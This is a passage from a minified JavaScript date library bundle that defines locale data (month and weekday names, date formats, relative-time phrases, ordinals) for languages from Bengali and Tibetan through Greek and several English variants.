        weekdaysShort: "রবি_সোম_মঙ্গল_বুধ_বৃহস্পতি_শুক্র_শনি".split("_"),
        weekdaysMin: "রবি_সোম_মঙ্গ_বুধ_বৃহঃ_শুক্র_শনি".split("_"),
        longDateFormat: {
            LT: "A h:mm সময়",
            LTS: "A h:mm:ss সময়",
            L: "DD/MM/YYYY",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY, A h:mm সময়",
            LLLL: "dddd, D MMMM YYYY, A h:mm সময়"
        },
        calendar: {
            sameDay: "[আজ] LT",
            nextDay: "[আগামীকাল] LT",
            nextWeek: "dddd, LT",
            lastDay: "[গতকাল] LT",
            lastWeek: "[গত] dddd, LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "%s পরে",
            past: "%s আগে",
            s: "কয়েক সেকেন্ড",
            m: "এক মিনিট",
            mm: "%d মিনিট",
            h: "এক ঘন্টা",
            hh: "%d ঘন্টা",
            d: "এক দিন",
            dd: "%d দিন",
            M: "এক মাস",
            MM: "%d মাস",
            y: "এক বছর",
            yy: "%d বছর"
        },
        preparse: function(e) {
            return e.replace(/[১২৩৪৫৬৭৮৯০]/g, function(e) {
                return ji[e]
            })
        },
        postformat: function(e) {
            return e.replace(/\d/g, function(e) {
                return Ei[e]
            })
        },
        meridiemParse: /রাত|সকাল|দুপুর|বিকাল|রাত/,
        meridiemHour: function(e, t) {
            return 12 === e && (e = 0),
            "রাত" === t && 4 <= e || "দুপুর" === t && e < 5 || "বিকাল" === t ? e + 12 : e
        },
        meridiem: function(e, t, n) {
            return e < 4 ? "রাত" : e < 10 ? "সকাল" : e < 17 ? "দুপুর" : e < 20 ? "বিকাল" : "রাত"
        },
        week: {
            dow: 0,
            doy: 6
        }
    });
    var Ci = {
        1: "༡",
        2: "༢",
        3: "༣",
        4: "༤",
        5: "༥",
        6: "༦",
        7: "༧",
        8: "༨",
        9: "༩",
        0: "༠"
    }
      , Ai = {
        "༡": "1",
        "༢": "2",
        "༣": "3",
        "༤": "4",
        "༥": "5",
        "༦": "6",
        "༧": "7",
        "༨": "8",
        "༩": "9",
        "༠": "0"
    };
    _.defineLocale("bo", {
        months: "ཟླ་བ་དང་པོ_ཟླ་བ་གཉིས་པ_ཟླ་བ་གསུམ་པ_ཟླ་བ་བཞི་པ_ཟླ་བ་ལྔ་པ_ཟླ་བ་དྲུག་པ_ཟླ་བ་བདུན་པ_ཟླ་བ་བརྒྱད་པ_ཟླ་བ་དགུ་པ_ཟླ་བ་བཅུ་པ_ཟླ་བ་བཅུ་གཅིག་པ_ཟླ་བ་བཅུ་གཉིས་པ".split("_"),
        monthsShort: "ཟླ་བ་དང་པོ_ཟླ་བ་གཉིས་པ_ཟླ་བ་གསུམ་པ_ཟླ་བ་བཞི་པ_ཟླ་བ་ལྔ་པ_ཟླ་བ་དྲུག་པ_ཟླ་བ་བདུན་པ_ཟླ་བ་བརྒྱད་པ_ཟླ་བ་དགུ་པ_ཟླ་བ་བཅུ་པ_ཟླ་བ་བཅུ་གཅིག་པ_ཟླ་བ་བཅུ་གཉིས་པ".split("_"),
        weekdays: "གཟའ་ཉི་མ་_གཟའ་ཟླ་བ་_གཟའ་མིག་དམར་_གཟའ་ལྷག་པ་_གཟའ་ཕུར་བུ_གཟའ་པ་སངས་_གཟའ་སྤེན་པ་".split("_"),
        weekdaysShort: "ཉི་མ་_ཟླ་བ་_མིག་དམར་_ལྷག་པ་_ཕུར་བུ_པ་སངས་_སྤེན་པ་".split("_"),
        weekdaysMin: "ཉི་མ་_ཟླ་བ་_མིག་དམར་_ལྷག་པ་_ཕུར་བུ_པ་སངས་_སྤེན་པ་".split("_"),
        longDateFormat: {
            LT: "A h:mm",
            LTS: "A h:mm:ss",
            L: "DD/MM/YYYY",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY, A h:mm",
            LLLL: "dddd, D MMMM YYYY, A h:mm"
        },
        calendar: {
            sameDay: "[དི་རིང] LT",
            nextDay: "[སང་ཉིན] LT",
            nextWeek: "[བདུན་ཕྲག་རྗེས་མ], LT",
            lastDay: "[ཁ་སང] LT",
            lastWeek: "[བདུན་ཕྲག་མཐའ་མ] dddd, LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "%s ལ་",
            past: "%s སྔན་ལ",
            s: "ལམ་སང",
            m: "སྐར་མ་གཅིག",
            mm: "%d སྐར་མ",
            h: "ཆུ་ཚོད་གཅིག",
            hh: "%d ཆུ་ཚོད",
            d: "ཉིན་གཅིག",
            dd: "%d ཉིན་",
            M: "ཟླ་བ་གཅིག",
            MM: "%d ཟླ་བ",
            y: "ལོ་གཅིག",
            yy: "%d ལོ"
        },
        preparse: function(e) {
            return e.replace(/[༡༢༣༤༥༦༧༨༩༠]/g, function(e) {
                return Ai[e]
            })
        },
        postformat: function(e) {
            return e.replace(/\d/g, function(e) {
                return Ci[e]
            })
        },
        meridiemParse: /མཚན་མོ|ཞོགས་ཀས|ཉིན་གུང|དགོང་དག|མཚན་མོ/,
        meridiemHour: function(e, t) {
            return 12 === e && (e = 0),
            "མཚན་མོ" === t && 4 <= e || "ཉིན་གུང" === t && e < 5 || "དགོང་དག" === t ? e + 12 : e
        },
        meridiem: function(e, t, n) {
            return e < 4 ? "མཚན་མོ" : e < 10 ? "ཞོགས་ཀས" : e < 17 ? "ཉིན་གུང" : e < 20 ? "དགོང་དག" : "མཚན་མོ"
        },
        week: {
            dow: 0,
            doy: 6
        }
    }),
    _.defineLocale("br", {
        months: "Genver_C'hwevrer_Meurzh_Ebrel_Mae_Mezheven_Gouere_Eost_Gwengolo_Here_Du_Kerzu".split("_"),
        monthsShort: "Gen_C'hwe_Meu_Ebr_Mae_Eve_Gou_Eos_Gwe_Her_Du_Ker".split("_"),
        weekdays: "Sul_Lun_Meurzh_Merc'her_Yaou_Gwener_Sadorn".split("_"),
        weekdaysShort: "Sul_Lun_Meu_Mer_Yao_Gwe_Sad".split("_"),
        weekdaysMin: "Su_Lu_Me_Mer_Ya_Gw_Sa".split("_"),
        weekdaysParseExact: !0,
        longDateFormat: {
            LT: "h[e]mm A",
            LTS: "h[e]mm:ss A",
            L: "DD/MM/YYYY",
            LL: "D [a viz] MMMM YYYY",
            LLL: "D [a viz] MMMM YYYY h[e]mm A",
            LLLL: "dddd, D [a viz] MMMM YYYY h[e]mm A"
        },
        calendar: {
            sameDay: "[Hiziv da] LT",
            nextDay: "[Warc'hoazh da] LT",
            nextWeek: "dddd [da] LT",
            lastDay: "[Dec'h da] LT",
            lastWeek: "dddd [paset da] LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "a-benn %s",
            past: "%s 'zo",
            s: "un nebeud segondennoù",
            m: "ur vunutenn",
            mm: Ue,
            h: "un eur",
            hh: "%d eur",
            d: "un devezh",
            dd: Ue,
            M: "ur miz",
            MM: Ue,
            y: "ur bloaz",
            yy: function(e) {
                switch (function e(t) {
                    return 9 < t ? e(t % 10) : t
                }(e)) {
                case 1:
                case 3:
                case 4:
                case 5:
                case 9:
                    return e + " bloaz";
                default:
                    return e + " vloaz"
                }
            }
        },
        ordinalParse: /\d{1,2}(añ|vet)/,
        ordinal: function(e) {
            return e + (1 === e ? "añ" : "vet")
        },
        week: {
            dow: 1,
            doy: 4
        }
    }),
    _.defineLocale("bs", {
        months: "januar_februar_mart_april_maj_juni_juli_august_septembar_oktobar_novembar_decembar".split("_"),
        monthsShort: "jan._feb._mar._apr._maj._jun._jul._aug._sep._okt._nov._dec.".split("_"),
        monthsParseExact: !0,
        weekdays: "nedjelja_ponedjeljak_utorak_srijeda_četvrtak_petak_subota".split("_"),
        weekdaysShort: "ned._pon._uto._sri._čet._pet._sub.".split("_"),
        weekdaysMin: "ne_po_ut_sr_če_pe_su".split("_"),
        weekdaysParseExact: !0,
        longDateFormat: {
            LT: "H:mm",
            LTS: "H:mm:ss",
            L: "DD.MM.YYYY",
            LL: "D. MMMM YYYY",
            LLL: "D. MMMM YYYY H:mm",
            LLLL: "dddd, D. MMMM YYYY H:mm"
        },
        calendar: {
            sameDay: "[danas u] LT",
            nextDay: "[sutra u] LT",
            nextWeek: function() {
                switch (this.day()) {
                case 0:
                    return "[u] [nedjelju] [u] LT";
                case 3:
                    return "[u] [srijedu] [u] LT";
                case 6:
                    return "[u] [subotu] [u] LT";
                case 1:
                case 2:
                case 4:
                case 5:
                    return "[u] dddd [u] LT"
                }
            },
            lastDay: "[jučer u] LT",
            lastWeek: function() {
                switch (this.day()) {
                case 0:
                case 3:
                    return "[prošlu] dddd [u] LT";
                case 6:
                    return "[prošle] [subote] [u] LT";
                case 1:
                case 2:
                case 4:
                case 5:
                    return "[prošli] dddd [u] LT"
                }
            },
            sameElse: "L"
        },
        relativeTime: {
            future: "za %s",
            past: "prije %s",
            s: "par sekundi",
            m: Je,
            mm: Je,
            h: Je,
            hh: Je,
            d: "dan",
            dd: Je,
            M: "mjesec",
            MM: Je,
            y: "godinu",
            yy: Je
        },
        ordinalParse: /\d{1,2}\./,
        ordinal: "%d.",
        week: {
            dow: 1,
            doy: 7
        }
    }),
    _.defineLocale("ca", {
        months: "gener_febrer_març_abril_maig_juny_juliol_agost_setembre_octubre_novembre_desembre".split("_"),
        monthsShort: "gen._febr._mar._abr._mai._jun._jul._ag._set._oct._nov._des.".split("_"),
        monthsParseExact: !0,
        weekdays: "diumenge_dilluns_dimarts_dimecres_dijous_divendres_dissabte".split("_"),
        weekdaysShort: "dg._dl._dt._dc._dj._dv._ds.".split("_"),
        weekdaysMin: "Dg_Dl_Dt_Dc_Dj_Dv_Ds".split("_"),
        weekdaysParseExact: !0,
        longDateFormat: {
            LT: "H:mm",
            LTS: "H:mm:ss",
            L: "DD/MM/YYYY",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY H:mm",
            LLLL: "dddd D MMMM YYYY H:mm"
        },
        calendar: {
            sameDay: function() {
                return "[avui a " + (1 !== this.hours() ? "les" : "la") + "] LT"
            },
            nextDay: function() {
                return "[demà a " + (1 !== this.hours() ? "les" : "la") + "] LT"
            },
            nextWeek: function() {
                return "dddd [a " + (1 !== this.hours() ? "les" : "la") + "] LT"
            },
            lastDay: function() {
                return "[ahir a " + (1 !== this.hours() ? "les" : "la") + "] LT"
            },
            lastWeek: function() {
                return "[el] dddd [passat a " + (1 !== this.hours() ? "les" : "la") + "] LT"
            },
            sameElse: "L"
        },
        relativeTime: {
            future: "d'aquí %s",
            past: "fa %s",
            s: "uns segons",
            m: "un minut",
            mm: "%d minuts",
            h: "una hora",
            hh: "%d hores",
            d: "un dia",
            dd: "%d dies",
            M: "un mes",
            MM: "%d mesos",
            y: "un any",
            yy: "%d anys"
        },
        ordinalParse: /\d{1,2}(r|n|t|è|a)/,
        ordinal: function(e, t) {
            var n = 1 === e ? "r" : 2 === e ? "n" : 3 === e ? "r" : 4 === e ? "t" : "è";
            return "w" !== t && "W" !== t || (n = "a"),
            e + n
        },
        week: {
            dow: 1,
            doy: 4
        }
    });
    var Pi = "leden_únor_březen_duben_květen_červen_červenec_srpen_září_říjen_listopad_prosinec".split("_")
      , Oi = "led_úno_bře_dub_kvě_čvn_čvc_srp_zář_říj_lis_pro".split("_");
    _.defineLocale("cs", {
        months: Pi,
        monthsShort: Oi,
        monthsParse: function(e, t) {
            var n, i = [];
            for (n = 0; n < 12; n++)
                i[n] = new RegExp("^" + e[n] + "$|^" + t[n] + "$","i");
            return i
        }(Pi, Oi),
        shortMonthsParse: function(e) {
            var t, n = [];
            for (t = 0; t < 12; t++)
                n[t] = new RegExp("^" + e[t] + "$","i");
            return n
        }(Oi),
        longMonthsParse: function(e) {
            var t, n = [];
            for (t = 0; t < 12; t++)
                n[t] = new RegExp("^" + e[t] + "$","i");
            return n
        }(Pi),
        weekdays: "neděle_pondělí_úterý_středa_čtvrtek_pátek_sobota".split("_"),
        weekdaysShort: "ne_po_út_st_čt_pá_so".split("_"),
        weekdaysMin: "ne_po_út_st_čt_pá_so".split("_"),
        longDateFormat: {
            LT: "H:mm",
            LTS: "H:mm:ss",
            L: "DD.MM.YYYY",
            LL: "D. MMMM YYYY",
            LLL: "D. MMMM YYYY H:mm",
            LLLL: "dddd D. MMMM YYYY H:mm",
            l: "D. M. YYYY"
        },
        calendar: {
            sameDay: "[dnes v] LT",
            nextDay: "[zítra v] LT",
            nextWeek: function() {
                switch (this.day()) {
                case 0:
                    return "[v neděli v] LT";
                case 1:
                case 2:
                    return "[v] dddd [v] LT";
                case 3:
                    return "[ve středu v] LT";
                case 4:
                    return "[ve čtvrtek v] LT";
                case 5:
                    return "[v pátek v] LT";
                case 6:
                    return "[v sobotu v] LT"
                }
            },
            lastDay: "[včera v] LT",
            lastWeek: function() {
                switch (this.day()) {
                case 0:
                    return "[minulou neděli v] LT";
                case 1:
                case 2:
                    return "[minulé] dddd [v] LT";
                case 3:
                    return "[minulou středu v] LT";
                case 4:
                case 5:
                    return "[minulý] dddd [v] LT";
                case 6:
                    return "[minulou sobotu v] LT"
                }
            },
            sameElse: "L"
        },
        relativeTime: {
            future: "za %s",
            past: "před %s",
            s: Ge,
            m: Ge,
            mm: Ge,
            h: Ge,
            hh: Ge,
            d: Ge,
            dd: Ge,
            M: Ge,
            MM: Ge,
            y: Ge,
            yy: Ge
        },
        ordinalParse: /\d{1,2}\./,
        ordinal: "%d.",
        week: {
            dow: 1,
            doy: 4
        }
    }),
    _.defineLocale("cv", {
        months: "кӑрлач_нарӑс_пуш_ака_май_ҫӗртме_утӑ_ҫурла_авӑн_юпа_чӳк_раштав".split("_"),
        monthsShort: "кӑр_нар_пуш_ака_май_ҫӗр_утӑ_ҫур_авн_юпа_чӳк_раш".split("_"),
        weekdays: "вырсарникун_тунтикун_ытларикун_юнкун_кӗҫнерникун_эрнекун_шӑматкун".split("_"),
        weekdaysShort: "выр_тун_ытл_юн_кӗҫ_эрн_шӑм".split("_"),
        weekdaysMin: "вр_тн_ыт_юн_кҫ_эр_шм".split("_"),
        longDateFormat: {
            LT: "HH:mm",
            LTS: "HH:mm:ss",
            L: "DD-MM-YYYY",
            LL: "YYYY [ҫулхи] MMMM [уйӑхӗн] D[-мӗшӗ]",
            LLL: "YYYY [ҫулхи] MMMM [уйӑхӗн] D[-мӗшӗ], HH:mm",
            LLLL: "dddd, YYYY [ҫулхи] MMMM [уйӑхӗн] D[-мӗшӗ], HH:mm"
        },
        calendar: {
            sameDay: "[Паян] LT [сехетре]",
            nextDay: "[Ыран] LT [сехетре]",
            lastDay: "[Ӗнер] LT [сехетре]",
            nextWeek: "[Ҫитес] dddd LT [сехетре]",
            lastWeek: "[Иртнӗ] dddd LT [сехетре]",
            sameElse: "L"
        },
        relativeTime: {
            future: function(e) {
                return e + (/сехет$/i.exec(e) ? "рен" : /ҫул$/i.exec(e) ? "тан" : "ран")
            },
            past: "%s каялла",
            s: "пӗр-ик ҫеккунт",
            m: "пӗр минут",
            mm: "%d минут",
            h: "пӗр сехет",
            hh: "%d сехет",
            d: "пӗр кун",
            dd: "%d кун",
            M: "пӗр уйӑх",
            MM: "%d уйӑх",
            y: "пӗр ҫул",
            yy: "%d ҫул"
        },
        ordinalParse: /\d{1,2}-мӗш/,
        ordinal: "%d-мӗш",
        week: {
            dow: 1,
            doy: 7
        }
    }),
    _.defineLocale("cy", {
        months: "Ionawr_Chwefror_Mawrth_Ebrill_Mai_Mehefin_Gorffennaf_Awst_Medi_Hydref_Tachwedd_Rhagfyr".split("_"),
        monthsShort: "Ion_Chwe_Maw_Ebr_Mai_Meh_Gor_Aws_Med_Hyd_Tach_Rhag".split("_"),
        weekdays: "Dydd Sul_Dydd Llun_Dydd Mawrth_Dydd Mercher_Dydd Iau_Dydd Gwener_Dydd Sadwrn".split("_"),
        weekdaysShort: "Sul_Llun_Maw_Mer_Iau_Gwe_Sad".split("_"),
        weekdaysMin: "Su_Ll_Ma_Me_Ia_Gw_Sa".split("_"),
        weekdaysParseExact: !0,
        longDateFormat: {
            LT: "HH:mm",
            LTS: "HH:mm:ss",
            L: "DD/MM/YYYY",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY HH:mm",
            LLLL: "dddd, D MMMM YYYY HH:mm"
        },
        calendar: {
            sameDay: "[Heddiw am] LT",
            nextDay: "[Yfory am] LT",
            nextWeek: "dddd [am] LT",
            lastDay: "[Ddoe am] LT",
            lastWeek: "dddd [diwethaf am] LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "mewn %s",
            past: "%s yn ôl",
            s: "ychydig eiliadau",
            m: "munud",
            mm: "%d munud",
            h: "awr",
            hh: "%d awr",
            d: "diwrnod",
            dd: "%d diwrnod",
            M: "mis",
            MM: "%d mis",
            y: "blwyddyn",
            yy: "%d flynedd"
        },
        ordinalParse: /\d{1,2}(fed|ain|af|il|ydd|ed|eg)/,
        ordinal: function(e) {
            var t = "";
            return 20 < e ? t = 40 === e || 50 === e || 60 === e || 80 === e || 100 === e ? "fed" : "ain" : 0 < e && (t = ["", "af", "il", "ydd", "ydd", "ed", "ed", "ed", "fed", "fed", "fed", "eg", "fed", "eg", "eg", "fed", "eg", "eg", "fed", "eg", "fed"][e]),
            e + t
        },
        week: {
            dow: 1,
            doy: 4
        }
    }),
    _.defineLocale("da", {
        months: "januar_februar_marts_april_maj_juni_juli_august_september_oktober_november_december".split("_"),
        monthsShort: "jan_feb_mar_apr_maj_jun_jul_aug_sep_okt_nov_dec".split("_"),
        weekdays: "søndag_mandag_tirsdag_onsdag_torsdag_fredag_lørdag".split("_"),
        weekdaysShort: "søn_man_tir_ons_tor_fre_lør".split("_"),
        weekdaysMin: "sø_ma_ti_on_to_fr_lø".split("_"),
        longDateFormat: {
            LT: "HH:mm",
            LTS: "HH:mm:ss",
            L: "DD/MM/YYYY",
            LL: "D. MMMM YYYY",
            LLL: "D. MMMM YYYY HH:mm",
            LLLL: "dddd [d.] D. MMMM YYYY HH:mm"
        },
        calendar: {
            sameDay: "[I dag kl.] LT",
            nextDay: "[I morgen kl.] LT",
            nextWeek: "dddd [kl.] LT",
            lastDay: "[I går kl.] LT",
            lastWeek: "[sidste] dddd [kl] LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "om %s",
            past: "%s siden",
            s: "få sekunder",
            m: "et minut",
            mm: "%d minutter",
            h: "en time",
            hh: "%d timer",
            d: "en dag",
            dd: "%d dage",
            M: "en måned",
            MM: "%d måneder",
            y: "et år",
            yy: "%d år"
        },
        ordinalParse: /\d{1,2}\./,
        ordinal: "%d.",
        week: {
            dow: 1,
            doy: 4
        }
    }),
    _.defineLocale("de-at", {
        months: "Jänner_Februar_März_April_Mai_Juni_Juli_August_September_Oktober_November_Dezember".split("_"),
        monthsShort: "Jän._Febr._Mrz._Apr._Mai_Jun._Jul._Aug._Sept._Okt._Nov._Dez.".split("_"),
        monthsParseExact: !0,
        weekdays: "Sonntag_Montag_Dienstag_Mittwoch_Donnerstag_Freitag_Samstag".split("_"),
        weekdaysShort: "So._Mo._Di._Mi._Do._Fr._Sa.".split("_"),
        weekdaysMin: "So_Mo_Di_Mi_Do_Fr_Sa".split("_"),
        weekdaysParseExact: !0,
        longDateFormat: {
            LT: "HH:mm",
            LTS: "HH:mm:ss",
            L: "DD.MM.YYYY",
            LL: "D. MMMM YYYY",
            LLL: "D. MMMM YYYY HH:mm",
            LLLL: "dddd, D. MMMM YYYY HH:mm"
        },
        calendar: {
            sameDay: "[heute um] LT [Uhr]",
            sameElse: "L",
            nextDay: "[morgen um] LT [Uhr]",
            nextWeek: "dddd [um] LT [Uhr]",
            lastDay: "[gestern um] LT [Uhr]",
            lastWeek: "[letzten] dddd [um] LT [Uhr]"
        },
        relativeTime: {
            future: "in %s",
            past: "vor %s",
            s: "ein paar Sekunden",
            m: Xe,
            mm: "%d Minuten",
            h: Xe,
            hh: "%d Stunden",
            d: Xe,
            dd: Xe,
            M: Xe,
            MM: Xe,
            y: Xe,
            yy: Xe
        },
        ordinalParse: /\d{1,2}\./,
        ordinal: "%d.",
        week: {
            dow: 1,
            doy: 4
        }
    }),
    _.defineLocale("de", {
        months: "Januar_Februar_März_April_Mai_Juni_Juli_August_September_Oktober_November_Dezember".split("_"),
        monthsShort: "Jan._Febr._Mrz._Apr._Mai_Jun._Jul._Aug._Sept._Okt._Nov._Dez.".split("_"),
        monthsParseExact: !0,
        weekdays: "Sonntag_Montag_Dienstag_Mittwoch_Donnerstag_Freitag_Samstag".split("_"),
        weekdaysShort: "So._Mo._Di._Mi._Do._Fr._Sa.".split("_"),
        weekdaysMin: "So_Mo_Di_Mi_Do_Fr_Sa".split("_"),
        weekdaysParseExact: !0,
        longDateFormat: {
            LT: "HH:mm",
            LTS: "HH:mm:ss",
            L: "DD.MM.YYYY",
            LL: "D. MMMM YYYY",
            LLL: "D. MMMM YYYY HH:mm",
            LLLL: "dddd, D. MMMM YYYY HH:mm"
        },
        calendar: {
            sameDay: "[heute um] LT [Uhr]",
            sameElse: "L",
            nextDay: "[morgen um] LT [Uhr]",
            nextWeek: "dddd [um] LT [Uhr]",
            lastDay: "[gestern um] LT [Uhr]",
            lastWeek: "[letzten] dddd [um] LT [Uhr]"
        },
        relativeTime: {
            future: "in %s",
            past: "vor %s",
            s: "ein paar Sekunden",
            m: Ke,
            mm: "%d Minuten",
            h: Ke,
            hh: "%d Stunden",
            d: Ke,
            dd: Ke,
            M: Ke,
            MM: Ke,
            y: Ke,
            yy: Ke
        },
        ordinalParse: /\d{1,2}\./,
        ordinal: "%d.",
        week: {
            dow: 1,
            doy: 4
        }
    });
    var Ni = ["ޖެނުއަރީ", "ފެބްރުއަރީ", "މާރިޗު", "އޭޕްރީލު", "މޭ", "ޖޫން", "ޖުލައި", "އޯގަސްޓު", "ސެޕްޓެމްބަރު", "އޮކްޓޯބަރު", "ނޮވެމްބަރު", "ޑިސެމްބަރު"]
      , Fi = ["އާދިއްތަ", "ހޯމަ", "އަންގާރަ", "ބުދަ", "ބުރާސްފަތި", "ހުކުރު", "ހޮނިހިރު"];
    _.defineLocale("dv", {
        months: Ni,
        monthsShort: Ni,
        weekdays: Fi,
        weekdaysShort: Fi,
        weekdaysMin: "އާދި_ހޯމަ_އަން_ބުދަ_ބުރާ_ހުކު_ހޮނި".split("_"),
        longDateFormat: {
            LT: "HH:mm",
            LTS: "HH:mm:ss",
            L: "D/M/YYYY",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY HH:mm",
            LLLL: "dddd D MMMM YYYY HH:mm"
        },
        meridiemParse: /މކ|މފ/,
        isPM: function(e) {
            return "މފ" === e
        },
        meridiem: function(e, t, n) {
            return e < 12 ? "މކ" : "މފ"
        },
        calendar: {
            sameDay: "[މިއަދު] LT",
            nextDay: "[މާދަމާ] LT",
            nextWeek: "dddd LT",
            lastDay: "[އިއްޔެ] LT",
            lastWeek: "[ފާއިތުވި] dddd LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "ތެރޭގައި %s",
            past: "ކުރިން %s",
            s: "ސިކުންތުކޮޅެއް",
            m: "މިނިޓެއް",
            mm: "މިނިޓު %d",
            h: "ގަޑިއިރެއް",
            hh: "ގަޑިއިރު %d",
            d: "ދުވަހެއް",
            dd: "ދުވަސް %d",
            M: "މަހެއް",
            MM: "މަސް %d",
            y: "އަހަރެއް",
            yy: "އަހަރު %d"
        },
        preparse: function(e) {
            return e.replace(/،/g, ",")
        },
        postformat: function(e) {
            return e.replace(/,/g, "،")
        },
        week: {
            dow: 7,
            doy: 12
        }
    }),
    _.defineLocale("el", {
        monthsNominativeEl: "Ιανουάριος_Φεβρουάριος_Μάρτιος_Απρίλιος_Μάιος_Ιούνιος_Ιούλιος_Αύγουστος_Σεπτέμβριος_Οκτώβριος_Νοέμβριος_Δεκέμβριος".split("_"),
        monthsGenitiveEl: "Ιανουαρίου_Φεβρουαρίου_Μαρτίου_Απριλίου_Μαΐου_Ιουνίου_Ιουλίου_Αυγούστου_Σεπτεμβρίου_Οκτωβρίου_Νοεμβρίου_Δεκεμβρίου".split("_"),
        months: function(e, t) {
            return /D/.test(t.substring(0, t.indexOf("MMMM"))) ? this._monthsGenitiveEl[e.month()] : this._monthsNominativeEl[e.month()]
        },
        monthsShort: "Ιαν_Φεβ_Μαρ_Απρ_Μαϊ_Ιουν_Ιουλ_Αυγ_Σεπ_Οκτ_Νοε_Δεκ".split("_"),
        weekdays: "Κυριακή_Δευτέρα_Τρίτη_Τετάρτη_Πέμπτη_Παρασκευή_Σάββατο".split("_"),
        weekdaysShort: "Κυρ_Δευ_Τρι_Τετ_Πεμ_Παρ_Σαβ".split("_"),
        weekdaysMin: "Κυ_Δε_Τρ_Τε_Πε_Πα_Σα".split("_"),
        meridiem: function(e, t, n) {
            return 11 < e ? n ? "μμ" : "ΜΜ" : n ? "πμ" : "ΠΜ"
        },
        isPM: function(e) {
            return "μ" === (e + "").toLowerCase()[0]
        },
        meridiemParse: /[ΠΜ]\.?Μ?\.?/i,
        longDateFormat: {
            LT: "h:mm A",
            LTS: "h:mm:ss A",
            L: "DD/MM/YYYY",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY h:mm A",
            LLLL: "dddd, D MMMM YYYY h:mm A"
        },
        calendarEl: {
            sameDay: "[Σήμερα {}] LT",
            nextDay: "[Αύριο {}] LT",
            nextWeek: "dddd [{}] LT",
            lastDay: "[Χθες {}] LT",
            lastWeek: function() {
                switch (this.day()) {
                case 6:
                    return "[το προηγούμενο] dddd [{}] LT";
                default:
                    return "[την προηγούμενη] dddd [{}] LT"
                }
            },
            sameElse: "L"
        },
        calendar: function(e, t) {
            var n = this._calendarEl[e]
              , i = t && t.hours();
            return w(n) && (n = n.apply(t)),
            n.replace("{}", i % 12 == 1 ? "στη" : "στις")
        },
        relativeTime: {
            future: "σε %s",
            past: "%s πριν",
            s: "λίγα δευτερόλεπτα",
            m: "ένα λεπτό",
            mm: "%d λεπτά",
            h: "μία ώρα",
            hh: "%d ώρες",
            d: "μία μέρα",
            dd: "%d μέρες",
            M: "ένας μήνας",
            MM: "%d μήνες",
            y: "ένας χρόνος",
            yy: "%d χρόνια"
        },
        ordinalParse: /\d{1,2}η/,
        ordinal: "%dη",
        week: {
            dow: 1,
            doy: 4
        }
    }),
    _.defineLocale("en-au", {
        months: "January_February_March_April_May_June_July_August_September_October_November_December".split("_"),
        monthsShort: "Jan_Feb_Mar_Apr_May_Jun_Jul_Aug_Sep_Oct_Nov_Dec".split("_"),
        weekdays: "Sunday_Monday_Tuesday_Wednesday_Thursday_Friday_Saturday".split("_"),
        weekdaysShort: "Sun_Mon_Tue_Wed_Thu_Fri_Sat".split("_"),
        weekdaysMin: "Su_Mo_Tu_We_Th_Fr_Sa".split("_"),
        longDateFormat: {
            LT: "h:mm A",
            LTS: "h:mm:ss A",
            L: "DD/MM/YYYY",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY h:mm A",
            LLLL: "dddd, D MMMM YYYY h:mm A"
        },
        calendar: {
            sameDay: "[Today at] LT",
            nextDay: "[Tomorrow at] LT",
            nextWeek: "dddd [at] LT",
            lastDay: "[Yesterday at] LT",
            lastWeek: "[Last] dddd [at] LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "in %s",
            past: "%s ago",
            s: "a few seconds",
            m: "a minute",
            mm: "%d minutes",
            h: "an hour",
            hh: "%d hours",
            d: "a day",
            dd: "%d days",
            M: "a month",
            MM: "%d months",
            y: "a year",
            yy: "%d years"
        },
        ordinalParse: /\d{1,2}(st|nd|rd|th)/,
        ordinal: function(e) {
            var t = e % 10;
            return e + (1 == ~~(e % 100 / 10) ? "th" : 1 == t ? "st" : 2 == t ? "nd" : 3 == t ? "rd" : "th")
        },
        week: {
            dow: 1,
            doy: 4
        }
    }),
    _.defineLocale("en-ca", {
        months: "January_February_March_April_May_June_July_August_September_October_November_December".split("_"),
        monthsShort: "Jan_Feb_Mar_Apr_May_Jun_Jul_Aug_Sep_Oct_Nov_Dec".split("_"),
        weekdays: "Sunday_Monday_Tuesday_Wednesday_Thursday_Friday_Saturday".split("_"),
        weekdaysShort: "Sun_Mon_Tue_Wed_Thu_Fri_Sat".split("_"),
        weekdaysMin: "Su_Mo_Tu_We_Th_Fr_Sa".split("_"),
        longDateFormat: {
            LT: "h:mm A",
            LTS: "h:mm:ss A",
            L: "YYYY-MM-DD",
            LL: "MMMM D, YYYY",
            LLL: "MMMM D, YYYY h:mm A",
            LLLL: "dddd, MMMM D, YYYY h:mm A"
        },
        calendar: {
            sameDay: "[Today at] LT",
            nextDay: "[Tomorrow at] LT",
            nextWeek: "dddd [at] LT",
            lastDay: "[Yesterday at] LT",
            lastWeek: "[Last] dddd [at] LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "in %s",
            past: "%s ago",
            s: "a few seconds",
            m: "a minute",
            mm: "%d minutes",
            h: "an hour",
            hh: "%d hours",
            d: "a day",
            dd: "%d days",
            M: "a month",
            MM: "%d months",
            y: "a year",
            yy: "%d years"
        },
        ordinalParse: /\d{1,2}(st|nd|rd|th)/,
        ordinal: function(e) {
            var t = e % 10;
            return e + (1 == ~~(e % 100 / 10) ? "th" : 1 == t ? "st" : 2 == t ? "nd" : 3 == t ? "rd" : "th")
        }
    }),
    _.defineLocale("en-gb", {
        months: "January_February_March_April_May_June_July_August_September_October_November_December".split("_"),
        monthsShort: "Jan_Feb_Mar_Apr_May_Jun_Jul_Aug_Sep_Oct_Nov_Dec".split("_"),
        weekdays: "Sunday_Monday_Tuesday_Wednesday_Thursday_Friday_Saturday".split("_"),
        weekdaysShort: "Sun_Mon_Tue_Wed_Thu_Fri_Sat".split("_"),
        weekdaysMin: "Su_Mo_Tu_We_Th_Fr_Sa".split("_"),
        longDateFormat: {
            LT: "HH:mm",
            LTS: "HH:mm:ss",
            L: "DD/MM/YYYY",
